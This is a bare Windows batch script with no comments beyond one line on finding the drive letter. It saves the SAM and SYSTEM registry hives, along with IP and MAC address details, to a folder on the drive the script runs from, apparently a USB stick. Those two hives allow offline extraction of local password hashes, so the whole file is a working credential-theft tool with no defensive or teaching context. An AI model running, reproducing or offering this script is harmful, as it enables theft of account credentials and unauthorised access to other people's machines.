@echo off
setlocal

rem Get the drive letter of the script's directory
for %%A in ("%~dp0") do (
    set "driveLetter=%%~dA"
)

Rem  echo Drive Letter of the Script's Directory: %driveLetter%

reg save HKLM\sam %driveLetter%\hee\sam.save
reg save HKLM\system %driveLetter%\hee\system.save
ipconfig > %driveLetter%\hee\ip.txt 
getmac > %driveLetter%\hee\mac.txt 

endlocal


pause